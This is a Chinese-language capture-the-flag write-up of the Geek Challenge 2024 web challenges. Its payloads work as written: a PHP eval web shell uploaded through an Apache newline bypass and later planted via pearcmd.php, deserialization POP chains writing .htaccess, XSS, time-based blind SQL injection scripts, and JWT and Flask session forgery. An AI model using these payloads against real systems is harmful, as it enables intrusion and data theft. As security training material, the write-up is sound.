---
title: "极客大挑战2024wp--web"
date: 2025-03-25T15:07:48+08:00
summary: "极客大挑战2024wp"
url: "/posts/极客大挑战2024wp-web/"
categories:
  - "赛题wp"
tags:
  - "极客大挑战2024"
draft: false
---

# 0x01前言

极客2024没来得及比赛就结束了，所以下面的都是后面复现去做的

# 0x02赛题

# baby_upload

hint:Parar说他的黑名单无懈可击，GSBP师傅只花了十分钟就拿下了他的权限，你看看怎么绕过呢

![image-20241125151101143](image/image-20241125151101143.png)

先上传一个php文件看看

![image-20250325093558530](image/image-20250325093558530.png)

有过滤，把文件内容删掉后测试发现存在后缀名验证，先看看能不能绕过这个，后面我随便上传一个图片都显示上传失败，有点神奇

换个思路，先随便在url中传入一个路径

![image-20250325094724950](image/image-20250325094724950.png)

版本apache2.4.10，CVE-2017-15715,然后当时就复现了一下写在另一篇文章了，这里直接给payload

先上传我们的一句话木马然后抓包

```
POST /index.php HTTP/2
Host: 80-74c251eb-096f-471b-ac79-241c6f54f8bc.challenge.ctfplus.cn
Cookie: _ga=GA1.1.143187499.1742196271; _clck=1553zmg%7C2%7Cfui%7C0%7C1902; _ga_BFDVYZJ3DE=GS1.1.1742866027.5.1.1742866306.0.0.0
Content-Length: 420
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Origin: https://80-74c251eb-096f-471b-ac79-241c6f54f8bc.challenge.ctfplus.cn
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCrce63X7dVz32SvP
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://80-74c251eb-096f-471b-ac79-241c6f54f8bc.challenge.ctfplus.cn/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i

------WebKitFormBoundaryCrce63X7dVz32SvP
Content-Disposition: form-data; name="upload_file"; filename="1.php"
Content-Type: application/octet-stream

<?php @eval($_POST['cmd']); ?>
------WebKitFormBoundaryCrce63X7dVz32SvP
Content-Disposition: form-data; name="name"

1.php
------WebKitFormBoundaryCrce63X7dVz32SvP
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryCrce63X7dVz32SvP--

```

name的值是我自己设置的1.php，然后在1.php后加上0a

![image-20250325102404387](image/image-20250325102404387.png)

上传返回uploads/1.php路径，我们访问uploads/1.php%0a能访问出来，蚁剑连接拿flag

# Problem_On_My_Web

starven师傅想要向他的女神表白，所以他专门写了个表白墙用来写他的甜言蜜语，你能看看他的表白墙有什么问题吗

![image-20250325103258392](image/image-20250325103258392.png)

看到url里的参数去测试了一下发现漏洞点不在这

然后在/manager路径下有一个提示

```
If you could tell me where my website has a problem,i would give you a gift in my cookies!!! [Post url=]
```

post传参url=]提示Your host must be 127.0.0.1 and can be visit，但是修改请求头后没打通

在/forms看到有留言板，打xss测试一下

```
<script>alert(1)</script>
```

一开始没看到有弹窗，然后把网页关掉重新开就有了，重新开靶机打xss

根据刚刚的那个提示，尝试把cookie带出来

```
<script>alert(document.cookie)</script>
```

然后在/manager路径post

```
url=127.0.0.1
```

传这个之后应该就会有管理员去触发我们的xss

![image-20250325110835015](image/image-20250325110835015.png)

# rce_me

Just rce me

```php
<?php
header("Content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
error_reporting(0);

# Can you RCE me?


if (!is_array($_POST["start"])) {
    if (!preg_match("/start.*now/is", $_POST["start"])) {
        if (strpos($_POST["start"], "start now") === false) {
            die("Well, you haven't started.<br>");
        }
    }
}

echo "Welcome to GeekChallenge2024!<br>";

if (
    sha1((string) $_POST["__2024.geekchallenge.ctf"]) == md5("Geekchallenge2024_bmKtL") &&
    (string) $_POST["__2024.geekchallenge.ctf"] != "Geekchallenge2024_bmKtL" &&
    is_numeric(intval($_POST["__2024.geekchallenge.ctf"]))
) {
    echo "You took the first step!<br>";

    foreach ($_GET as $key => $value) {
        $$key = $value;
    }

    if (intval($year) < 2024 && intval($year + 1) > 2025) {
        echo "Well, I know the year is 2024<br>";

        if (preg_match("/.+?rce/ism", $purpose)) {
            die("nonono");
        }

        if (stripos($purpose, "rce") === false) {
            die("nonononono");
        }
        echo "Get the flag now!<br>";
        eval($GLOBALS['code']);
        
        

        
    } else {
        echo "It is not enough to stop you!<br>";
    }
} else {
    echo "It is so easy, do you know sha1 and md5?<br>";
}
?>
Well, you haven't started.
```

按照代码先post传一个start=start now进行下面的代码

```php
if (
    sha1((string) $_POST["__2024.geekchallenge.ctf"]) == md5("Geekchallenge2024_bmKtL") &&
    (string) $_POST["__2024.geekchallenge.ctf"] != "Geekchallenge2024_bmKtL" &&
    is_numeric(intval($_POST["__2024.geekchallenge.ctf"]))
)
```

将Geekchallenge2024_bmKtL进行md5加密后发现值为0e开头的0e073277003087724660601042042394，这里就是强碰撞了，但是要求我们传入纯数字的__2024.geekchallenge.ctf，那我们就直接找sha1加密后是0e开头的看看里面有没有纯数字的值

## sha1强碰撞

```php
<?php
$a = 10932435112;
$b = "Geekchallenge2024_bmKtL";
if (sha1($a) == md5($b)){
    echo "right";
}
//right
```

参考：https://blog.csdn.net/cosmoslin/article/details/120973888

payload

```
start=start now&__2024.geekchallenge.ctf=10932435112
```

## 非法变量解析

一开始没成功，后面仔细看发现是非法变量的问题，用[去绕过就行

```
start=start now&_[2024.geekchallenge.ctf=10932435112
```

![image-20250325112941629](image/image-20250325112941629.png)

继续下一层

```php
foreach ($_GET as $key => $value) {
        $$key = $value;
    }

    if (intval($year) < 2024 && intval($year + 1) > 2025) {
        echo "Well, I know the year is 2024<br>";

        if (preg_match("/.+?rce/ism", $purpose)) {
            die("nonono");
        }

        if (stripos($purpose, "rce") === false) {
            die("nonononono");
        }
        echo "Get the flag now!<br>";
        eval($GLOBALS['code']);
```

$$下的动态变量，进行**变量覆盖**

可以创建后续要用的 $year $purpose $code

##  intval() 的截断特性

- `intval()` 函数会将字符串转换为整数，但会截断非数字部分。，例如我们传入2023e1经过处理后就是2023

所以我们传入year=2023e1

```
在intval处理后就是2023，是满足<2024的，但是后面的intval($year+1)>2025是为什么可以满足呢？
在 $year + 1 中，如果 $year 是字符串，PHP 会尝试将其转换为数字。
"2023e1" + 1 返回 20231（因为 "2023e1" 被解析为科学计数法，即 2023 * 10^1 = 20230，加 1 后为 20231）。
```

![image-20250325113914557](image/image-20250325113914557.png)

然后$purpose的话需要绕过stripos

## 绕过stripos

用数组可以绕过这个判断，stripos在处理数组的时候会返回null，是等于false的

![image-20250325114440904](image/image-20250325114440904.png)

最后code就传命令进行rce就行

![image-20250325114545681](image/image-20250325114545681.png)

# ezpop

## #死亡exit绕过

```php
<?php
Class SYC{
    public $starven;
    public function __call($name, $arguments){
        if(preg_match('/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i',$this->starven)){
            die('no hack');
        }
        file_put_contents($this->starven,"<?php exit();".$this->starven);
    }
}

Class lover{
    public $J1rry;
    public $meimeng;
    public function __destruct(){
        if(isset($this->J1rry)&&file_get_contents($this->J1rry)=='Welcome GeekChallenge 2024'){
            echo "success";
            $this->meimeng->source;
        }
    }

    public function __invoke()
    {
        echo $this->meimeng;
    }

}

Class Geek{
    public $GSBP;
    public function __get($name){
        $Challenge = $this->GSBP;
        return $Challenge();
    }

    public function __toString(){
        $this->GSBP->Getflag();
        return "Just do it";
    }

}

if($_GET['data']){
    if(preg_match("/meimeng/i",$_GET['data'])){
        die("no hack");
    }
   unserialize($_GET['data']);
}else{
   highlight_file(__FILE__);
}
```

第一眼猜是php反序列化，继续往下看

其实这道题的pop链很简单啊，每个触发点都是很明白的，直接写pop链就行

```
lover::__destruct->Geek::__get->lover::->__invoke->Geek::__toString->SYC::__call
```

然后我们需要关注一个点就是关于死亡exit的绕过

[php死亡exit()绕过](https://xiaolong22333.top/archives/114/)

第二种情况

```
file_put_contents($content,"<?php exit();".$content);
```

可以用rot13编码绕过

```
content=php://filter/string.rot13|<?cuc cucvasb();?>|/resource=shell.php
通过管道符进行逐步执行，将中间的进行rot13编码后写入shell.php中
```

exp

```php
<?php
Class SYC{
    public $starven;
}

Class lover{
    public $J1rry="data://text/plain,Welcome GeekChallenge 2024";
    public $meimeng;


}

Class Geek{
    public $GSBP;

}
$a = new lover();
$a->meimeng=new Geek();
$a->meimeng->GSBP = new lover();
$a->meimeng->GSBP->meimeng = new Geek();
$a->meimeng->GSBP->meimeng->GSBP = new SYC();
$a->meimeng->GSBP->meimeng->GSBP->starven = 'php://filter/string.rot13|<?cuc cucvasb();?>|/resource=shell.php';
$b = serialize($a);
//$c=str_replace("s:7:\"meimeng\";","S:7:\"\\6deimeng\";",$b);//绕过wakeup以及
echo urlencode($c);
```

序列化后的字符

```
O:5:"lover":2:{s:5:"J1rry";s:44:"data://text/plain,Welcome GeekChallenge 2024";s:7:"\6deimeng";O:4:"Geek":1:{s:4:"GSBP";O:5:"lover":2:{s:5:"J1rry";s:44:"data://text/plain,Welcome GeekChallenge 2024";s:7:"\6deimeng";O:4:"Geek":1:{s:4:"GSBP";O:3:"SYC":1:{s:7:"starven";s:64:"php://filter/string.rot13|<?cuc cucvasb();?>|/resource=shell.php";}}}}}
```

额没注意看这里过滤了rot，那就试着.htaccess预处理包含文件，自定义包含flag文件

```
php://filter/write=string.strip_tags/?>php_value
auto_prepend_file /flag"."\n"."#/resource=.htaccess
```

解释一下payload

- `write=string.strip_tags` 是 `php://filter` 的一个过滤器，表示在写入数据时，使用 `strip_tags` 函数去除 HTML 和 PHP 标签。
- `?>`：关闭 PHP 标签，表示后续内容是纯文本。
- `php_value auto_prepend_file /flag`：这是一个 Apache 配置指令，表示在执行 PHP 脚本之前，自动包含 `/flag` 文件。
- `"\n"`：换行符，用于分隔指令。
- `#`：注释符号，表示后续内容被忽略。
- `/resource=.htaccess` 指定了目标文件为 `.htaccess`。

那最终的exp就是

```php
<?php
Class SYC{
    public $starven;
}

Class lover{
    public $J1rry="data://text/plain,Welcome GeekChallenge 2024";
    public $meimeng;


}

Class Geek{
    public $GSBP;

}
$a = new lover();
$a->meimeng=new Geek();
$a->meimeng->GSBP = new lover();
$a->meimeng->GSBP->meimeng = new Geek();
$a->meimeng->GSBP->meimeng->GSBP = new SYC();
$a->meimeng->GSBP->meimeng->GSBP->starven = "php://filter/write=string.strip_tags/?>php_value_auto_prepend_file /flag"."\n"."#/resource=/htaccess";
$b = serialize($a);
$c=str_replace("s:7:\"meimeng\";","S:7:\"\\6deimeng\";",$b);
echo urlencode($c);
```

payload

```
?data=O%3A5%3A%22lover%22%3A2%3A%7Bs%3A5%3A%22J1rry%22%3Bs%3A44%3A%22data%3A%2F%2Ftext%2Fplain%2CWelcome+GeekChallenge+2024%22%3BS%3A7%3A%22%5C6deimeng%22%3BO%3A4%3A%22Geek%22%3A1%3A%7Bs%3A4%3A%22GSBP%22%3BO%3A5%3A%22lover%22%3A2%3A%7Bs%3A5%3A%22J1rry%22%3Bs%3A44%3A%22data%3A%2F%2Ftext%2Fplain%2CWelcome+GeekChallenge+2024%22%3BS%3A7%3A%22%5C6deimeng%22%3BO%3A4%3A%22Geek%22%3A1%3A%7Bs%3A4%3A%22GSBP%22%3BO%3A3%3A%22SYC%22%3A1%3A%7Bs%3A7%3A%22starven%22%3Bs%3A93%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dstring.strip_tags%2F%3F%3Ephp_value+auto_prepend_file+%2Fflag%0A%23%2Fresource%3D.htaccess%22%3B%7D%7D%7D%7D%7D
```

![image-20250325155043866](image/image-20250325155043866.png)

**为什么这里是大写 `S`？**

- 在 PHP 的序列化字符串中，如果字符串包含 **非 ASCII 字符** 或 **转义字符**，PHP 会使用 `S` 标记来表示这是一个 **二进制安全的字符串**。

在 `S:7:"\6deimeng";` 中，大写 `S` 的出现是因为字符串中包含了转义字符 `\6`。PHP 的序列化机制会自动将包含转义字符或非 ASCII 字符的字符串标记为二进制安全字符串，因此使用 `S` 而不是 `s`。

# ez_include

## #require_once 绕过不能重复包含文件的限制

```php

<?php
highlight_file(__FILE__);
require_once 'starven_secret.php';
if(isset($_GET['file'])) {
    if(preg_match('/starven_secret.php/i', $_GET['file'])) {
        require_once $_GET['file'];
    }else{
        echo "还想非预期?";
    }
}
```

有限制的文件包含，之前有学习过

看看php的版本，是PHP/7.3.22，那就不能用00截断去包含，试试路径长度截断文件包含

操作系统存在着最大路径长度的限制。可以输入超过最大路劲长度的目录，这样系统就会将后面的路劲丢弃，导致拓展名截断。

- Windows下最大路径长度为256B
- Linux下最大路径长度为4096B

大部分靶机都是Linux环境啊那我们就试一下

```
?file=php://filter/convert.base64-
encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/sel
f/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/roo
t/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php
```

通过 `preg_match` 检查用户输入，确保只有包含 `starven_secret.php` 的路径才能被加载。，但由于 `require_once` 的特性，即使匹配成功，也不会重复加载目标文件。所以我们想要读取到starven_secret.php，就需要通过构造超长路径，使得路径被截断，最终访问到 `starven_secret.php`。

![image-20250325161751528](image/image-20250325161751528.png)

出来了，拿去解密一下

```
<?php
$secret = "congratulation! you can goto /levelllll2.php to capture the flag!";
?>
```

## #pear文件包含

访问/levelllll2.php得到

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if (isset($_GET ["syc"])){
    $file = $_GET ["syc"];
    $hint = "register_argc_argv = On";
    if (preg_match("/config|create|filter|download|phar|log|sess|-c|-d|%|data/i", $file)) {
        die("hint都给的这么明显了还不会做?");
    }
    if(substr($_SERVER['REQUEST_URI'], -4) === '.php'){
        include $file;
    }
}
```

分析

```
register_argc_argv = On
```

意味着 PHP 会启用对命令行参数的处理，并将这些参数传递给脚本的 `$argc` 和 `$argv` 变量。

- `$argc` 变量会存储命令行参数的数量（包括脚本名称）。
- `$argv` 变量会存储一个数组，包含所有命令行参数。

考虑pear文件包含，利用pearcmd.php进行包含

因为这里create禁用了，所以可以通过远程包含的方式去包含一句话木马文件

payload

```
?syc=/usr/local/lib/php/pearcmd.php&+config-create+/<?=@eval($_POST['cmd']);?>+/var/www/html/shell.php
```

打了半天没打通，最后发现是hackbar传参会把<和>进行编码导致我们的木马失效，那就用bp发包吧

```
GET /levelllll2.php?syc=/usr/local/lib/php/pearcmd.php&+config-create+/<?=@eval($_POST['cmd']);?>+/var/www/html/shell.php HTTP/1.1
Host: 80-2686a728-2d3c-41a7-93c4-237b011ac5b1.challenge.ctfplus.cn
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: _ga=GA1.1.143187499.1742196271; _clck=1553zmg%7C2%7Cfui%7C0%7C1902; _ga_BFDVYZJ3DE=GS1.1.1742889070.9.1.1742889075.0.0.0; _clsk=9d8936%7C1742894848566%7C1%7C1%7Cw.clarity.ms%2Fcollect
Connection: keep-alive


```

然后hackbar

![image-20250325175347931](image/image-20250325175347931.png)

成功RCE，发现disable_function里没有禁用函数，那就找flag

```
cmd=print_r($_SERVER);
```

flag找了半天目录没找到，估计是在环境变量里

![image-20250325181210240](image/image-20250325181210240.png)

# ez_http

前面跟着做就行

第一层

```
Level1: please use get parameter welcome
nonono,I need welcome == geekchallenge2024
```

GET传参

```
?welcome=geekchallenge2024
```

第二层

```
Level2：please user two post params username & password
nonono, username=Starven , password=qwert123456
```

POST传参

```
username=Starven&password=qwert123456
```

第三层

```
Level3：you must from https://www.sycsec.com
```

设置Referer请求头

```
Referer: https://www.sycsec.com
```

第四层

```
Level4：you must from local ip
```

设置X-Forwarded-For

```
X-Forwarded-For: 127.0.0.1
```

标识客户端的原始 IP 地址，但是发现没成功

换成X-Real-IP

```
X-Real-IP: 127.0.0.1
```

标识客户端的真实 IP 地址。

第五层

```php
Level5：you must let Starven give you flag
<?php
if ($_SERVER["HTTP_STARVEN"] == "I_Want_Flag") {
    echo "........";
}
nonono,you can't get my flag
```

意思很明显了，设置个STARVEN请求头

```
STARVEN: I_Want_Flag
```

![image-20250325194244675](image/image-20250325194244675.png)

有一段token，那就解密一下

![image-20250325194447928](image/image-20250325194447928.png)

JWT的，估计是需要将hasFlag改为true

源码里发现了key

```
<!--key is "Starven_secret_key"-->
```

## 伪造JWT知识点

参考文章：[JWT及JWT伪造](https://blog.csdn.net/qq_45521281/article/details/106073624)

首先需要了解的就是传统的session认证和基于token的鉴权机制的区别，session伪造之前有学过，这里就直接讲后者了

## 基于token的鉴权机制

基于token的鉴权机制类似于http协议也是无状态的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着**基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了**，这就为应用的扩展提供了便利。

机制流程：

- 用户使用用户名密码来请求服务器
- 服务器进行验证用户的信息
- **服务器通过验证发送给用户一个token**
- **客户端存储token，并在每次请求时附送上这个token值**
- 服务端验证token值，并返回数据

然后就是JWT的构成

## JWT的构成

JWT的数据格式分为三个部分： headers , payloads，signature(签名)，它们使用`.`点号分割。

头部（header)

将json进行base64就组成了JWT的头部

jwt的头部承载两部分信息：

- **声明类型**
- **声明加密的算法**，通常直接使用 HMAC SHA256。这的加密算法也就是签名算法。

例如这道题目中的第一段解密后就是

```
{"typ":"JWT","alg":"HS256"}
```

载荷（payload）

载荷就是**存放有效信息的地方**。这个名字像是特指飞机上承载的货品，**这些有效信息包含三个部分**

- 标准中注册的声明
- 公共的声明
- 私有的声明

例如我们题目中的第二部分进行base64解密后就是

```
{"iss":"Starven","aud":"Ctfer","iat":1742903065,"nbf":1742903065,"exp":1742910265,"username":"Starven","password":"qwert123456","hasFlag":false}
```

签证（signature）
jwt的第三部分是一个签证信息，这个签证信息由三部分组成：

- header (base64加密后的)

- payload (base64加密后的)
- secret

这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。

**注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret，那就意味着客户端是可以自我签发jwt了。**

所以我们这道题中的key应该就是secret私钥，接下来我们讲JWT token破解绕过

## JWT token破解绕过

基于刚刚我们把token进行解密可以看到外面需要将hasFlag改为true，而且要通过服务器的验证，这点很重要，并不是直接把false改成true就万事大吉了。因为服务器收到token后会对token的有效性进行验证。

验证方法：首先服务端会产生一个key，然后以这个key作为密钥，使用第一部分选择的加密方式（这里就是HS256），对第一部分和第二部分拼接的结果进行加密，然后把加密结果放到第三部分。

服务器每次收到信息都会对它的前两部分进行加密，然后比对加密后的结果是否跟客户端传送过来的第三部分相同，如果相同则验证通过，否则失败。

因为加密算法我们已经知道了，我们只要再得到加密的key，我们就能伪造数据，并且通过服务器的检查。

JWT破解工具：https://github.com/brendan-rius/c-jwt-cracker

解码网站：https://jwt.io/

![image-20250325200849930](image/image-20250325200849930.png)

解密网站：https://www.bejson.com/jwt/

![image-20250325202257551](image/image-20250325202257551.png)

设置为true后放入key进行编码，然后传入cookie请求头中

总的payload就是

```
POST /?welcome=geekchallenge2024 HTTP/1.1
Host: 80-702bb6be-bcc4-4300-a30e-b7101cc44548.challenge.ctfplus.cn
Content-Length: 37
Cache-Control: max-age=0
Origin: http://80-702bb6be-bcc4-4300-a30e-b7101cc44548.challenge.ctfplus.cn
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://www.sycsec.com
X-Real-IP: 127.0.0.1
STARVEN: I_Want_Flag
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
cookie:token= eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3NDI5MDQ2MDksIm5iZiI6MTc0MjkwNDYwOSwiZXhwIjoxNzQyOTExODA5LCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6dHJ1ZX0.EJpNrB7OOHahdDVAwhXz-bgCJbApP8hUxBqgku2husk
Connection: keep-alive

username=Starven&password=qwert123456
```

# funnySQL

## #时间盲注

就是一个简单的SQL啦 - SYC{}内的字母全为小写

![image-20250326190252228](image/image-20250326190252228.png)

需要提交username，没啥信息泄露，先测试一下吧

测试了一下发现有黑名单过滤，会返回警告

![image-20250326190918035](image/image-20250326190918035.png)

那就直接fuzz吧，测试的黑名单大致如下

```php
if(preg_match('/and|or| |\n|--|sleep|=|ascii/i',$str)){
    die('不准用！');
}
```

页面无回显也没报错，也没有正确与否的页面反馈，那就考虑时间盲注了

sleep被过滤了很好绕，可以用benchmark，=号可以用like去绕过，空格可以用/**/去绕过,先测试一下大致的延时

```
?username='||if(1,benchmark(2000000,sha1(1)),0)%23//休眠3.6秒左右
```

先爆数据库，payload：

```python
?username='||if((substr(database(),{i},1)/**/like/**/'{j}'),benchmark(2000000,sha1(1)),0)%23
#数据库名为syclover
```

这里还需要打无列名注入，因为or被ban了，information和performance这俩库都不能用，可以用innodb表，payload如下

```python
?username='||if((substr((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/'syclover'),{i},1)/**/like/**/'{j}'),benchmark(10000000,sha1(1)),0)%23
#表名有Rea11ys3ccccccr3333t,users
```

一开始没爆出来，后面发现数据库是小写的syclover，可能跟数据库默认的大小写规则有关

![image-20250327192539217](image/image-20250327192539217.png)

第一次爆表名的时候没注意到一个细节，如果设置j的范围是32-128的话，小写字母都会在`_`的时候卡住，这是因为**like的模糊匹配机制**导致的`_`可以匹配任意一个字符。所以需要改成准确的dict字符串去进行遍历

然后就是爆表中列名了，因为这里没过滤union和select，我们可以用union取别名去爆列中数据，但是我这里是直接把Rea11ys3ccccccr3333t的数据全部爆出来的，因为刚好表中就只有flag。

```python
import time
import requests
import datetime

url = "http://80-90a9708b-3563-4bfb-a6cd-544252819a6f.challenge.ctfplus.cn/index.php"

dict = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#&'()*+,-./:;<=>?@[\]^`{|}~"
table = ""
for i in range(1,50):
    sign = 0
    for j in dict:
        payload = f"?username='||if((substr((select/**/*/**/from/**/Rea11ys3ccccccr3333t),{i},1)/**/like/**/'{j}'),benchmark(5000000,sha1(1)),0)%23"
        print(payload)

        time1 = datetime.datetime.now()

        r = requests.get(url+payload)

        time2 = datetime.datetime.now()
        sec = (time2-time1).seconds
        if sec > 2.5 :
            sign = 1
            table += j
            print(table)
            break
    if sign == 0 :
        break
print(table)
```



# py_game

一个注册和登录界面，注册后登录

![image-20250326161419115](image/image-20250326161419115.png)

提示只有admin才能访问admin面板，扫目录的时候看到有admin路径，但是访问的时候跳转到login登录界面了，猜测是需要伪造admin身份去登录才能访问

有小游戏，在/play源码中得到提示

```
<!--嘿嘿,游戏通关也不会有flag 听说flag在/flag哦-->
```

给了flag的位置，此外就没啥可用的信息了，抓包之后也没看到有什么提示

## #伪造session

然后在注册页面输入admin之后显示用户名已存在，让我想起来之前sql的一个漏洞，用sql的验证机制去绕过尝试匹配admin登录，但是失败了

后来发现登录后的页面有session，试着用flask-unsign去解密

![image-20250326162846365](image/image-20250326162846365.png)

是flask下的session，猜测是利用session伪造admin，爆破一下密钥

![image-20250326163448792](image/image-20250326163448792.png)

伪造身份

![image-20250326163603956](image/image-20250326163603956.png)

在页面修改session然后刷新

![image-20250326163645089](image/image-20250326163645089.png)

这时候可用访问/admin路径了，有备份源码app.pyc，需要反编译

## #反编译+原型链污染

安装uncompyle6然后用这个进行反编译

```
pip install uncompyle6//安装python反编译器
uncompyle6 -o . app.pyc
```

拿到app.py

```py
# uncompyle6 version 3.9.2
# Python bytecode version base 3.6 (3379)
# Decompiled from: Python 3.12.8 (tags/v3.12.8:2dc476b, Dec  3 2024, 19:30:04) [MSC v.1942 64 bit (AMD64)]
# Embedded file name: ./tempdata/1f9adc12-c6f3-4a8a-9054-aa3792d2ac2e.py
# Compiled at: 2024-11-01 17:37:26
# Size of source mod 2**32: 5558 bytes
import json
from lxml import etree
from flask import Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonify
app = Flask(__name__)
app.secret_key = "a123456"
app.config["xml_data"] = '<?xml version="1.0" encoding="UTF-8"?><GeekChallenge2024><EventName>Geek Challenge</EventName><Year>2024</Year><Description>This is a challenge event for geeks in the year 2024.</Description></GeekChallenge2024>'

class User:

    def __init__(self, username, password):
        self.username = username
        self.password = password

    def check(self, data):
        return self.username == data["username"] and self.password == data["password"]


admin = User("admin", "123456j1rrynonono")
Users = [admin]

def update(src, dst):
    for k, v in src.items():
        if hasattr(dst, "__getitem__"):
            if dst.get(k):
                if isinstance(v, dict):
                    update(v, dst.get(k))
            dst[k] = v
        elif hasattr(dst, k) and isinstance(v, dict):
            update(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        for u in Users:
            if u.username == username:
                flash("用户名已存在", "error")
                return redirect(url_for("register"))

        new_user = User(username, password)
        Users.append(new_user)
        flash("注册成功！请登录", "success")
        return redirect(url_for("login"))
    else:
        return render_template("register.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        for u in Users:
            if u.check({'username':username,  'password':password}):
                session["username"] = username
                flash("登录成功", "success")
                return redirect(url_for("dashboard"))

        flash("用户名或密码错误", "error")
        return redirect(url_for("login"))
    else:
        return render_template("login.html")


@app.route("/play", methods=["GET", "POST"])
def play():
    if "username" in session:
        with open("/app/templates/play.html", "r", encoding="utf-8") as file:
            play_html = file.read()
        return play_html
    else:
        flash("请先登录", "error")
        return redirect(url_for("login"))


@app.route("/admin", methods=["GET", "POST"])
def admin():
    if "username" in session:
        if session["username"] == "admin":
            return render_template("admin.html", username=(session["username"]))
    flash("你没有权限访问", "error")
    return redirect(url_for("login"))


@app.route("/downloads321")
def downloads321():
    return send_file("./source/app.pyc", as_attachment=True)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/dashboard")
def dashboard():
    if "username" in session:
        is_admin = session["username"] == "admin"
        if is_admin:
            user_tag = "Admin User"
        else:
            user_tag = "Normal User"
        return render_template("dashboard.html", username=(session["username"]), tag=user_tag, is_admin=is_admin)
    else:
        flash("请先登录", "error")
        return redirect(url_for("login"))


@app.route("/xml_parse")
def xml_parse():
    try:
        xml_bytes = app.config["xml_data"].encode("utf-8")
        parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
        tree = etree.fromstring(xml_bytes, parser=parser)
        result_xml = etree.tostring(tree, pretty_print=True, encoding="utf-8", xml_declaration=True)
        return Response(result_xml, mimetype="application/xml")
    except etree.XMLSyntaxError as e:
        return str(e)


black_list = [
 "__class__".encode(), "__init__".encode(), "__globals__".encode()]

def check(data):
    print(data)
    for i in black_list:
        print(i)
        if i in data:
            print(i)
            return False

    return True


@app.route("/update", methods=["POST"])
def update_route():
    if "username" in session:
        if session["username"] == "admin":
            if request.data:
                try:
                    if not check(request.data):
                        return ('NONONO, Bad Hacker', 403)
                    else:
                        data = json.loads(request.data.decode())
                        print(data)
                        if all("static" not in str(value) and "dtd" not in str(value) and "file" not in str(value) and "environ" not in str(value) for value in data.values()):
                            update(data, User)
                            return (jsonify({"message": "更新成功"}), 200)
                        return ('Invalid character', 400)
                except Exception as e:
                    return (
                     f"Exception: {str(e)}", 500)

        else:
            return ('No data provided', 400)
    else:
        flash("你没有权限访问", "error")
        return redirect(url_for("login"))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=False)

```

关注一段比较重要的内容

```py
def update(src, dst):
    for k, v in src.items():#遍历src的键值对
        if hasattr(dst, "__getitem__"):#键值对字典形式，检测dst是否为字典
            if dst.get(k):
                if isinstance(v, dict):#检测是否存在键k且判断v是否为字典
                    update(v, dst.get(k))#递归调用
            dst[k] = v#将 src 中的键值对更新到 dst 中。
        elif hasattr(dst, k) and isinstance(v, dict):#dst不是字典但是包含属性k，且v为字典
            update(v, getattr(dst, k))#递归调用更新对象的属性
        else:
            setattr(dst, k, v)
            payload = {
    "__class__" : {
        "__base__" : {
            "secret" : "world"
        }
    }
}
```

